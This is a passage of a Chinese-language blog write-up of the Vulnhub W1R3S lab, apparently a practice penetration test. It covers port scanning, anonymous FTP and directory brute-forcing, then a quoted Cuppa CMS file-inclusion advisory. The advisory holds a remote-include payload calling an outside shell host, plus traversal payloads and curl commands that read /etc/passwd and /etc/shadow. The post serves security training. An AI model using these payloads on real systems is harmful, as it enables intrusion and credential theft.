

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/24.png">
  <link rel="icon" href="/img/24.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Jimi">
  <meta name="keywords" content="">
  
    <meta name="description" content="要细心，沉心地做信息搜集、资产测绘靶机 ip：192.168.17.145 端口扫描   1234567891011121314151617181920212223242526272829303132333435363738394041424344454647┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo nmap -sS -sV -T5 -A -p- 192.168.17.">
<meta property="og:type" content="article">
<meta property="og:title" content="vulnhub-w1r3s">
<meta property="og:url" content="https://jimi-lab.github.io/2025/06/30/vulnhub-w1r3s/index.html">
<meta property="og:site_name" content="Jimi&#39;s blog">
<meta property="og:description" content="要细心，沉心地做信息搜集、资产测绘靶机 ip：192.168.17.145 端口扫描   1234567891011121314151617181920212223242526272829303132333435363738394041424344454647┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ sudo nmap -sS -sV -T5 -A -p- 192.168.17.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/1.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/2.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/3.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/4.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/5.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/6.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/7.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/8.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/9.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/10.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/11.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/12.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/13.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/14.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/15.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/16.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/17.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/18.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/19.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/20.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/21.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/22.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/23.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/24.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/25.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/26.png">
<meta property="article:published_time" content="2025-06-30T11:21:39.000Z">
<meta property="article:modified_time" content="2025-06-30T11:39:33.068Z">
<meta property="article:author" content="Jimi">
<meta property="article:tag" content="Vulnhub靶场">
<meta property="article:tag" content="ftp匿名登录">
<meta property="article:tag" content="base64">
<meta property="article:tag" content="md5">
<meta property="article:tag" content="gobuster目录扫描">
<meta property="article:tag" content="dirb目录扫描">
<meta property="article:tag" content="Cuppa CMS渗透">
<meta property="article:tag" content="searchsploit漏洞信息搜集">
<meta property="article:tag" content="john密码破解">
<meta property="article:tag" content="ssh爆破">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://jimi-lab.github.io/img/vulnhub-w1r3s.md/1.png">
  
  
  
  <title>vulnhub-w1r3s - Jimi&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/background_video.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"jimi-lab.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Jimi</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/redCar.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="vulnhub-w1r3s"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-06-30 19:21" pubdate>
          2025年6月30日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          1.5k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          13 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">vulnhub-w1r3s</h1>
            
            
              <div class="markdown-body">
                
                <p>要细心，沉心地做信息搜集、资产测绘<br>靶机 ip：192.168.17.145</p>
<h1 id="Qj6sX">端口扫描</h1>


<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~/Desktop]<br>└─$ sudo nmap -sS -sV -T5 -A -p- <span class="hljs-number">192.168</span>.<span class="hljs-number">17.145</span><br>Starting Nmap <span class="hljs-number">7.95</span> ( https:<span class="hljs-comment">//nmap.org ) at 2025-06-30 03:10 EDT</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">17.145</span><br>Host is <span class="hljs-title function_ invoke__">up</span> (<span class="hljs-number">0.00088</span>s latency).<br>Not shown: <span class="hljs-number">55528</span> filtered tcp <span class="hljs-title function_ invoke__">ports</span> (no-response), <span class="hljs-number">10003</span> closed tcp <span class="hljs-title function_ invoke__">ports</span> (reset)<br>PORT     STATE SERVICE VERSION<br><span class="hljs-number">21</span>/tcp   open  ftp     vsftpd <span class="hljs-number">2.0</span>.<span class="hljs-number">8</span> <span class="hljs-keyword">or</span> later<br>| ftp-anon: Anonymous FTP login <span class="hljs-title function_ invoke__">allowed</span> (FTP code <span class="hljs-number">230</span>)<br>| drwxr-xr-x    <span class="hljs-number">2</span> ftp      ftp          <span class="hljs-number">4096</span> Jan <span class="hljs-number">23</span>  <span class="hljs-number">2018</span> content<br>| drwxr-xr-x    <span class="hljs-number">2</span> ftp      ftp          <span class="hljs-number">4096</span> Jan <span class="hljs-number">23</span>  <span class="hljs-number">2018</span> docs<br>|_drwxr-xr-x    <span class="hljs-number">2</span> ftp      ftp          <span class="hljs-number">4096</span> Jan <span class="hljs-number">28</span>  <span class="hljs-number">2018</span> <span class="hljs-keyword">new</span>-employees<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to ::<span class="hljs-variable constant_">ffff</span>:<span class="hljs-number">192.168</span>.<span class="hljs-number">17.136</span><br>|      Logged in <span class="hljs-keyword">as</span> ftp<br>|      TYPE: ASCII<br>|      No session bandwidth limit<br>|      Session timeout in seconds is <span class="hljs-number">300</span><br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was <span class="hljs-number">4</span><br>|      vsFTPd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span> - secure, fast, stable<br>|_End of status<br><span class="hljs-number">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2.<span class="hljs-number">4</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| ssh-hostkey: <br>|   <span class="hljs-number">2048</span> <span class="hljs-number">07</span>:e3:<span class="hljs-number">5</span>a:<span class="hljs-number">5</span>c:c8:<span class="hljs-number">18</span>:<span class="hljs-number">65</span>:b0:<span class="hljs-number">5</span>f:<span class="hljs-number">6</span>e:f7:<span class="hljs-number">75</span>:c7:<span class="hljs-number">7</span>e:<span class="hljs-number">11</span>:<span class="hljs-title function_ invoke__">e0</span> (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">03</span>:ab:<span class="hljs-number">9</span>a:ed:<span class="hljs-number">0</span>c:<span class="hljs-number">9</span>b:<span class="hljs-number">32</span>:<span class="hljs-number">26</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span>:ad:b0:b0:<span class="hljs-number">96</span>:c3:<span class="hljs-number">1</span>e (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">3</span>d:<span class="hljs-number">6</span>d:d2:<span class="hljs-number">4</span>b:<span class="hljs-number">46</span>:e8:c9:a3:<span class="hljs-number">49</span>:e0:<span class="hljs-number">93</span>:<span class="hljs-number">56</span>:<span class="hljs-number">22</span>:<span class="hljs-number">2</span>e:e3:<span class="hljs-number">54</span> (ED25519)<br><span class="hljs-number">80</span>/tcp   open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> ((Ubuntu))<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br><span class="hljs-number">3306</span>/tcp open  mysql   <span class="hljs-title function_ invoke__">MySQL</span> (unauthorized)<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">7</span>F:<span class="hljs-number">87</span>:<span class="hljs-title function_ invoke__">A6</span> (VMware)<br>Aggressive OS guesses: Linux <span class="hljs-number">3.10</span> - <span class="hljs-number">4.11</span> (<span class="hljs-number">98</span>%), Linux <span class="hljs-number">5.1</span> - <span class="hljs-number">5.15</span> (<span class="hljs-number">96</span>%), Linux <span class="hljs-number">3.2</span> - <span class="hljs-number">4.14</span> (<span class="hljs-number">94</span>%), Linux <span class="hljs-number">3.13</span> - <span class="hljs-number">4.4</span> (<span class="hljs-number">94</span>%), Linux <span class="hljs-number">4.10</span> (<span class="hljs-number">94</span>%), Linux <span class="hljs-number">3.10</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">4.4</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">3.16</span> - <span class="hljs-number">4.6</span> (<span class="hljs-number">92</span>%), OpenWrt <span class="hljs-number">19.07</span> (Linux <span class="hljs-number">4.14</span>) (<span class="hljs-number">92</span>%), Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span> - <span class="hljs-number">3.13</span> (<span class="hljs-number">91</span>%)<br>No exact OS matches <span class="hljs-keyword">for</span> <span class="hljs-title function_ invoke__">host</span> (test conditions non-ideal).<br>Network Distance: <span class="hljs-number">1</span> hop<br>Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">0.88</span> ms <span class="hljs-number">192.168</span>.<span class="hljs-number">17.145</span><br><br>OS <span class="hljs-keyword">and</span> Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP <span class="hljs-title function_ invoke__">address</span> (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">43.27</span> seconds<br><br></code></pre></td></tr></table></figure>





<h3 id="cQiN1">端口分析</h3>
21：大概率有信息泄露；ftp 也有历史漏洞可能可以利用

<p>22：可行性不大，ssh 版本较高</p>
<p>80：优先分析。一般是网站</p>
<p>3306：一般是 mysql</p>
<h4 id="Tobc4">nmap 漏洞扫描脚本</h4>

<p><img src="/../img/vulnhub-w1r3s.md/1.png"></p>
<p>nmap 没有扫出来，说明它不行…..你得自己找别的办法！  因为你是行的！</p>
<h1 id="FS8dt">21 端口</h1>
<h3 id="pdG8h">匿名登录 FTP</h3>
nmap 的扫描结果中说明可以匿名登录 ftp

<p><img src="/../img/vulnhub-w1r3s.md/2.png"></p>
<p>将 ftp 服务器中的文件 down 到本地</p>
<p><img src="/../img/vulnhub-w1r3s.md/3.png"></p>
<p>查看</p>
<p><img src="/../img/vulnhub-w1r3s.md/4.png"></p>
<h4 id="bU1Gs">查看加密算法</h4>

<p><img src="/../img/vulnhub-w1r3s.md/5.png"></p>
<p>md5 加密</p>
<p>那个没识别出来的，一眼就能看出来是 base64 嘛</p>
<h4 id="oWr3o">base64 解密</h4>

<p><img src="/../img/vulnhub-w1r3s.md/6.png"></p>
<h1 id="s6CLV">3306 端口</h1>
mysql

<p><img src="/../img/vulnhub-w1r3s.md/7.png"></p>
<h1 id="xitSx"> 80 端口</h1>

<p><img src="/../img/vulnhub-w1r3s.md/8.png"></p>
<p>apach 的首页，working</p>
<h4 id="GRqcg">gobuster 目录扫描</h4>

<p><img src="/../img/vulnhub-w1r3s.md/9.png"></p>
<p>administrator 可以访问</p>
<h4 id="wVCRh">dirb 目录爆破</h4>
对网站进行目录爆破

<p>dirb <a target="_blank" rel="noopener" href="http://192.168.17.145/">http://192.168.17.145</a></p>
<p>可以访问<a target="_blank" rel="noopener" href="http://192.168.17.145/administrator/installation/">http://192.168.17.145/administrator/installation/</a></p>
<p><img src="/../img/vulnhub-w1r3s.md/10.png"></p>
<h3 id="alQnL">对 wordprass 进行测试</h3>
先测试页面的有哪些功能

<p><img src="/../img/vulnhub-w1r3s.md/11.png"></p>
<p><img src="/../img/vulnhub-w1r3s.md/12.png"></p>
<p><strong>真实情况下，需要在网上找这个页面的独特信息。是否会造成不可逆的服务器修改？？！</strong></p>
<p><img src="/../img/vulnhub-w1r3s.md/13.png"></p>
<h2 id="W3BH8"> Cuppa CMS 渗透</h2>


<h4 id="IpUsC">searchsploit漏洞信息搜集</h4>
kali 中有自带的 searchsploit（**exploit-db.com 的本地版本**）

<p><img src="/../img/vulnhub-w1r3s.md/14.png"></p>
<p>漏洞信息：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/25971">https://www.exploit-db.com/exploits/25971</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs plain">                                                                                                                                                                  <br>┌──(kali㉿kali)-[~/VulnHub/w1r3s]<br>└─$ cat 25971.txt            <br># Exploit Title   : Cuppa CMS File Inclusion<br># Date            : 4 June 2013<br># Exploit Author  : CWH Underground<br># Site            : www.2600.in.th<br># Vendor Homepage : http://www.cuppacms.com/<br># Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip  //找开源的代码可以做代码审计<br># Version         : Beta<br># Tested on       : Window and Linux<br><br>  ,--^----------,--------,-----,-------^--,<br>  | |||||||||   `--------&#x27;     |          O .. CWH Underground Hacking Team ..<br>  `+---------------------------^----------|<br>    `\_,-------, _________________________|<br>      / XXXXXX /`|     /<br>     / XXXXXX /  `\   /<br>    / XXXXXX /\______(<br>   / XXXXXX /<br>  / XXXXXX /<br> (________(<br>  `------&#x27;<br><br>####################################<br>VULNERABILITY: PHP CODE INJECTION<br>####################################<br><br>/alerts/alertConfigField.php (LINE: 22)<br><br>-----------------------------------------------------------------------------<br>LINE 22:<br>        &lt;?php include($_REQUEST[&quot;urlConfig&quot;]); ?&gt;<br>-----------------------------------------------------------------------------<br><br><br>#####################################################<br>DESCRIPTION<br>#####################################################<br><br>An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.<br><br>http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]<br><br>#####################################################<br>EXPLOIT<br>#####################################################<br><br>http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?<br>http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd<br><br>Moreover, We could access Configuration.php source code via PHPStream<br><br>For Example:<br>-----------------------------------------------------------------------------<br>http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php<br>-----------------------------------------------------------------------------<br><br>Base64 Encode Output:<br>-----------------------------------------------------------------------------<br>PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+<br>-----------------------------------------------------------------------------<br><br>Base64 Decode Output:<br>-----------------------------------------------------------------------------<br>&lt;?php<br>        class Configuration&#123;<br>                public $host = &quot;localhost&quot;;<br>                public $db = &quot;cuppa&quot;;<br>                public $user = &quot;root&quot;;<br>                public $password = &quot;Db@dmin&quot;;<br>                public $table_prefix = &quot;cu_&quot;;<br>                public $administrator_template = &quot;default&quot;;<br>                public $list_limit = 25;<br>                public $token = &quot;OBqIPqlFWf3X&quot;;<br>                public $allowed_extensions = &quot;*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx&quot;;<br>                public $upload_default_path = &quot;media/uploadsFiles&quot;;<br>                public $maximum_file_size = &quot;5242880&quot;;<br>                public $secure_login = 0;<br>                public $secure_login_value = &quot;&quot;;<br>                public $secure_login_redirect = &quot;&quot;;<br>        &#125;<br>?&gt;<br>-----------------------------------------------------------------------------<br><br>Able to read sensitive information via File Inclusion (PHP Stream)<br><br>################################################################################################################<br> Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2<br>################################################################################################################                                                                                                                 <br></code></pre></td></tr></table></figure>





<h4 id="cVh6d">路径构造  （EXP）</h4>


<p><img src="/../img/vulnhub-w1r3s.md/15.png"></p>
<p><strong>可以看到需要 post 请求</strong></p>
<p><img src="/../img/vulnhub-w1r3s.md/16.png"></p>
<p>–data-urlencode 对 http  post 并使用 url 编码给到处理程序</p>
<p>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">curl --data-urlencode &#x27;urlConfig=../../../../../../../../../etc/passwd&#x27; http://192.168.17.145/administrator/alerts/alertConfigField.php<br></code></pre></td></tr></table></figure>



<p><img src="/../img/vulnhub-w1r3s.md/17.png">  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">curl --data-urlencode &#x27;urlConfig=../../../../../../../../../etc/shadow&#x27; http://192.168.17.145/administrator/alerts/alertConfigField.php<br></code></pre></td></tr></table></figure>

<p><img src="/../img/vulnhub-w1r3s.md/18.png"></p>
<h4 id="P3SkO">linux 下 passwd 和 shadow 的详解</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs 